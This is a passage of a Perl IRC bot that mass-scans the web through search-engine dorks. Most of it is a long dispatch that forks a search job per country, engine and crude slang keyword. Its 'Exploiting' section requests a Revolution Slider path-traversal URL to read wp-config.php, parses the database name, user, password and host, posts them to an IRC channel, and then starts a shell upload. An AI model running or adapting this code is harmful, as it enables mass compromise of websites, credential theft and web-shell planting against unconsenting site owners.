	if ($engine =~ /croatia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Croatia",$type,$nick); } exit; } }
	if ($engine =~ /cuba/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cuba",$type,$nick); } exit; } }
	if ($engine =~ /cyprus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cyprus",$type,$nick); } exit; } }
	if ($engine =~ /dominican/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Dominican",$type,$nick); } exit; } }
	if ($engine =~ /equador/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Equador",$type,$nick); } exit; } }
	if ($engine =~ /egypt/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Egypt",$type,$nick); } exit; } }
	if ($engine =~ /estonia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Estonia",$type,$nick); } exit; } }
	if ($engine =~ /finland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Finland",$type,$nick); } exit; } }
	if ($engine =~ /georgia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Georgia",$type,$nick); } exit; } }
	if ($engine =~ /ghana/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ghana",$type,$nick); } exit; } }
	if ($engine =~ /grenada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Grenada",$type,$nick); } exit; } }
	if ($engine =~ /honduras/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Honduras",$type,$nick); } exit; } }
	if ($engine =~ /hongkong/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hongkong",$type,$nick); } exit; } }
	if ($engine =~ /iceland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Iceland",$type,$nick); } exit; } }	
	if ($engine =~ /ireland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ireland",$type,$nick); } exit; } }
	if ($engine =~ /kenya/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kenya",$type,$nick); } exit; } }
	if ($engine =~ /kuwait/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kuwait",$type,$nick); } exit; } }
	if ($engine =~ /laos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Laos",$type,$nick); } exit; } }
	if ($engine =~ /latvia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Latvia",$type,$nick); } exit; } }
	if ($engine =~ /liberia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Liberia",$type,$nick); } exit; } }
	if ($engine =~ /libyan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Libyan",$type,$nick); } exit; } }
	if ($engine =~ /lithuania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Lithuania",$type,$nick); } exit; } }
	if ($engine =~ /macedonia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Macedonia",$type,$nick); } exit; } }
	if ($engine =~ /malta/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Malta",$type,$nick); } exit; } }
	if ($engine =~ /mongolia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mongolia",$type,$nick); } exit; } }
	if ($engine =~ /mozambique/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mozambique",$type,$nick); } exit; } }
	if ($engine =~ /namibia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Namibia",$type,$nick); } exit; } }
	if ($engine =~ /nauru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nauru",$type,$nick); } exit; } }
	if ($engine =~ /nepal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nepal",$type,$nick); } exit; } }
	if ($engine =~ /newzealand/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"NewZealand",$type,$nick); } exit; } }
	if ($engine =~ /nigeria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nigeria",$type,$nick); } exit; } }
	if ($engine =~ /paraguay/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Paraguay",$type,$nick); } exit; } }
	if ($engine =~ /peru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Peru",$type,$nick); } exit; } }
	if ($engine =~ /portugal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Portugal",$type,$nick); } exit; } }
	if ($engine =~ /puertorico/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PuertoRico",$type,$nick); } exit; } }
	if ($engine =~ /qatar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PuertoRico",$type,$nick); } exit; } }
	if ($engine =~ /saintlucia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SaintLucia",$type,$nick); } exit; } }
	if ($engine =~ /samoa/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Samoa",$type,$nick); } exit; } }
        if ($engine =~ /saudiarabia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &lfi($chan,$bug,dork,"SaudiArabia",$type,$nick); } exit; } }
	if ($engine =~ /senegal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Senegal",$type,$nick); } exit; } }
	if ($engine =~ /slovakia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Slovakia",$type,$nick); } exit; } }
	if ($engine =~ /srilanka/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Srilanka",$type,$nick); } exit; } }
	if ($engine =~ /swaziland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Swaziland",$type,$nick); } exit; } }
	if ($engine =~ /tajikistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tajikistan",$type,$nick); } exit; } }
	if ($engine =~ /tanzania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tanzania",$type,$nick); } exit; } }
	if ($engine =~ /tokelau/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tokelau",$type,$nick); } exit; } }
	if ($engine =~ /tonga/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tonga",$type,$nick); } exit; } }
	if ($engine =~ /tunisia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tunisia",$type,$nick); } exit; } }
	if ($engine =~ /uruguay/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uruguay",$type,$nick); } exit; } }
	if ($engine =~ /uzbekistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uzbekistan",$type,$nick); } exit; } }
	if ($engine =~ /venezuela/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Venezuela",$type,$nick); } exit; } }
	if ($engine =~ /yemen/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yemen",$type,$nick); } exit; } }
	if ($engine =~ /yugoslavia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yugoslavia",$type,$nick); } exit; } }
	if ($engine =~ /zambia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Zambia",$type,$nick); } exit; } }
	if ($engine =~ /uganda/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uganda",$type,$nick); } exit; } }
	if ($engine =~ /trinidad/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Trinidad",$type,$nick); } exit; } }
	if ($engine =~ /zimbabwe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Zimbabwe",$type,$nick); } exit; } }
	if ($engine =~ /kontol/i) { 
	if (my $pid = fork) { waitpid($pid, 0); } 
	else { if (fork) { exit; } else { 
		&type($chan,$bug,$dork,"KonToL",$type,$nick); 
	    } exit; } 
	}
     if ($engine =~ /pepek/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { 
		&type($chan,$bug,$dork,"PePek",$type,$nick);
		} exit; }
    }	
    if ($engine =~ /tetek/i) { 
        if (my $pid = fork) { waitpid($pid, 0); } 
        else { if (fork) { exit; } else { 
            &type($chan,$bug,$dork,"TeTek",$type,$nick); 
        } exit; } 
    } 
    if ($engine =~ /itil/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
        &type($chan,$bug,$dork,"ItiL",$type,$nick);
        } exit; }
    }				
	if ($engine =~ /vagina/i) {
    if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
        &type($chan,$bug,$dork,"Vagina",$type,$nick);
        } exit; }
    }	
	if ($engine =~ /nennen/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"NenNen",$type,$nick); 
		} exit; }
    }
	if ($engine =~ /susu/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else { 
		&type($chan,$bug,$dork,"SuSu",$type,$nick);
		} exit; }
    }		
	if ($engine =~ /buahdada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BuahDada",$type,$nick); } exit; } }
	if ($engine =~ /payudara/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PayuDara",$type,$nick); } exit; } }
	if ($engine =~ /kentot/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kentot",$type,$nick); } exit; } }
	if ($engine =~ /memek/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"MeMek",$type,$nick); } exit; } }
	if ($engine =~ /emel/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"eMeL",$type,$nick); } exit; } }
	if ($engine =~ /oral/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"OraL",$type,$nick); } exit; } }
	if ($engine =~ /klitoris/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Klitoris",$type,$nick); } exit; } }
	if ($engine =~ /masturbasi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Masturbasi",$type,$nick); } exit; } }
	if ($engine =~ /onani/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Onani",$type,$nick); } exit; } }
	if ($engine =~ /sperma/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sperma",$type,$nick); } exit; } }
	if ($engine =~ /anal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AnaL",$type,$nick); } exit; } }
	if ($engine =~ /puting/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Puting",$type,$nick); } exit; } }
	if ($engine =~ /penis/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Penis",$type,$nick); } exit; } }
	if ($engine =~ /googleCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCA",$type,$nick); } exit; } }
	if ($engine =~ /googleDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDE",$type,$nick); } exit; } }
	if ($engine =~ /googleUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUK",$type,$nick); } exit; } }
	if ($engine =~ /googleFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeFR",$type,$nick); } exit; } }
	if ($engine =~ /googleES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeES",$type,$nick); } exit; } }
	if ($engine =~ /googleIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIT",$type,$nick); } exit; } }
	if ($engine =~ /googleNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNL",$type,$nick); } exit; } }
	if ($engine =~ /googleBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBE",$type,$nick); } exit; } }
	if ($engine =~ /googleCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCH",$type,$nick); } exit; } }
	if ($engine =~ /googleSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeSE",$type,$nick); } exit; } }
	if ($engine =~ /googleDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDK",$type,$nick); } exit; } }
	if ($engine =~ /googleNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNO",$type,$nick); } exit; } }
	if ($engine =~ /googleNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNZ",$type,$nick); } exit; } }
	if ($engine =~ /googleIE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIE",$type,$nick); } exit; } }
	if ($engine =~ /googleBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBR",$type,$nick); } exit; } }
	if ($engine =~ /googleAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAR",$type,$nick); } exit; } }
	if ($engine =~ /googleCO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCO",$type,$nick); } exit; } }
	if ($engine =~ /googleCU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCU",$type,$nick); } exit; } }
	if ($engine =~ /googleCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCL",$type,$nick); } exit; } }
	if ($engine =~ /googleMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMX",$type,$nick); } exit; } }
	if ($engine =~ /googleAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAU",$type,$nick); } exit; } }
	if ($engine =~ /googleRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRU",$type,$nick); } exit; } }
	if ($engine =~ /googleAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAT",$type,$nick); } exit; } }
	if ($engine =~ /googlePL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePL",$type,$nick); } exit; } }
	if ($engine =~ /googleIL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIL",$type,$nick); } exit; } }
	if ($engine =~ /googleTR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTR",$type,$nick); } exit; } }
	if ($engine =~ /googleUA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUA",$type,$nick); } exit; } }
	if ($engine =~ /googleGR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeGR",$type,$nick); } exit; } }
	if ($engine =~ /googleJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeJP",$type,$nick); } exit; } }
	if ($engine =~ /googleCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCN",$type,$nick); } exit; } }
	if ($engine =~ /googleMY/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMY",$type,$nick); } exit; } }
	if ($engine =~ /googleTH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTH",$type,$nick); } exit; } }
	if ($engine =~ /googleIN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIN",$type,$nick); } exit; } }
	if ($engine =~ /googleKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeKR",$type,$nick); } exit; } }
	if ($engine =~ /googleRO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRO",$type,$nick); } exit; } }
	if ($engine =~ /googleTW/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTW",$type,$nick); } exit; } }
	if ($engine =~ /googleZA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeZA",$type,$nick); } exit; } }
	if ($engine =~ /googlePT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePT",$type,$nick); } exit; } }
	if ($engine =~ /bingDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDE",$type,$nick); } exit; } }
	if ($engine =~ /bingUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingUK",$type,$nick); } exit; } }
	if ($engine =~ /bingCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCA",$type,$nick); } exit; } }
	if ($engine =~ /bingBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBR",$type,$nick); } exit; } }
	if ($engine =~ /bingFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingFR",$type,$nick); } exit; } }
	if ($engine =~ /bingES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingES",$type,$nick); } exit; } }
	if ($engine =~ /bingIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingIT",$type,$nick); } exit; } }
	if ($engine =~ /bingBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBE",$type,$nick); } exit; } }
	if ($engine =~ /bingNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNL",$type,$nick); } exit; } }
	if ($engine =~ /bingPT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingPT",$type,$nick); } exit; } }
	if ($engine =~ /bingNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNO",$type,$nick); } exit; } }
	if ($engine =~ /bingDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDK",$type,$nick); } exit; } }
	if ($engine =~ /bingSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingSE",$type,$nick); } exit; } }
	if ($engine =~ /bingCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCH",$type,$nick); } exit; } }
	if ($engine =~ /bingNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNZ",$type,$nick); } exit; } }
	if ($engine =~ /bingRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingRU",$type,$nick); } exit; } }
	if ($engine =~ /bingJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingJP",$type,$nick); } exit; } }
	if ($engine =~ /bingCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCN",$type,$nick); } exit; } }
	if ($engine =~ /bingKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingKR",$type,$nick); } exit; } }
	if ($engine =~ /bingMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingMX",$type,$nick); } exit; } }
	if ($engine =~ /bingAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAR",$type,$nick); } exit; } }
	if ($engine =~ /bingCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCL",$type,$nick); } exit; } }
	if ($engine =~ /bingAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAU",$type,$nick); } exit; } }
	if ($engine =~ /askCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKCA",$type,$nick); } exit; } }
	if ($engine =~ /askDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDE",$type,$nick); } exit; } }
	if ($engine =~ /askIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKIT",$type,$nick); } exit; } }
	if ($engine =~ /askFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKFR",$type,$nick); } exit; } }
	if ($engine =~ /askES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKES",$type,$nick); } exit; } }
	if ($engine =~ /askRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKRU",$type,$nick); } exit; } }
	if ($engine =~ /askNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNL",$type,$nick); } exit; } }
	if ($engine =~ /askUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKUK",$type,$nick); } exit; } }
	if ($engine =~ /askBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKBR",$type,$nick); } exit; } }
	if ($engine =~ /askPL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKPL",$type,$nick); } exit; } }
	if ($engine =~ /askAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAU",$type,$nick); } exit; } }
	if ($engine =~ /askAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAT",$type,$nick); } exit; } }
	if ($engine =~ /askJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKJP",$type,$nick); } exit; } }
	if ($engine =~ /askSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKSE",$type,$nick); } exit; } }
	if ($engine =~ /askMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKMX",$type,$nick); } exit; } }
	if ($engine =~ /askNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNO",$type,$nick); } exit; } }
	if ($engine =~ /askDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDK",$type,$nick); } exit; } }	
}

#########################################	Exploiting

sub revslider() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $dork = $_[2];
	my $engine = $_[3];
	my $nick = $_[4];
	my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$searchlogo,$nick);
	my $num = scalar(@list);
    	if ($num > 0){
		foreach my $site(@list){
		$count++;
			
      			my $test = "http://".$site."wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
			my $re   = &get_content($test);
         		if ($re =~ /http:\/\//){
           		 &sql_xpl($test,$dork,$chan,$site,$engine,$rsqllogo,$nick);
			 &upload($site,$dork,$chan,$engine,$revlogo,$nick); sleep(2);
 	       		}
	if ($count == $num-1) {
			&msg("$chan","$searchlogo(7@2$engine15) 14Selesai");
			if ($engine =~ /eMeL/) {
				&sendraw("mode $chan -m");
				&msg("$chan","4- Advertising- 0,12 Add me on 9,5YM: addanaliaas");
				&msg("$chan","$searchlogo 0Capek kali bah.. tunggu la 5 menit lg ya baru scan lg, kl ga taik itu la makani, bujang!!!");
			}
		}
}
}
}
sub sql_xpl() {
     my $url    = $_[0];
     my $dork	= $_[1];
     my $chan   = $_[2];
     my $site   = $_[3];   
     my $engine = $_[4];
     my $logo   = $_[5];
     my $nick   = $_[6];
     my $data   = &get_content($url);
	my $psite  = "http://".$site;
	if ($psite =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) { $host = $2; }
	if ($data =~ /DB_NAME/) {
		my $db = ""; my $user = ""; my $pass = ""; my $dbhost = "";
		if ($data =~ m/'DB_NAME', '(.*)'/g) { $db = $1; }
		if ($data =~ m/'DB_USER', '(.*)'/g) { $user = $1; }
		if ($data =~ m/'DB_PASSWORD', '(.*)'/g) { $pass = $1; }
		if ($data =~ m/'DB_HOST', '(.*)'/g) { $dbhost = $1; }
		&msg("$chan","$logo(7@2$engine15) 4Database 5[Name: $db] [Host: $dbhost] [User : $user] [Pass : $pass]");
		&msg("$chan","$logo(7@2$engine15) 13Shell uploading...");
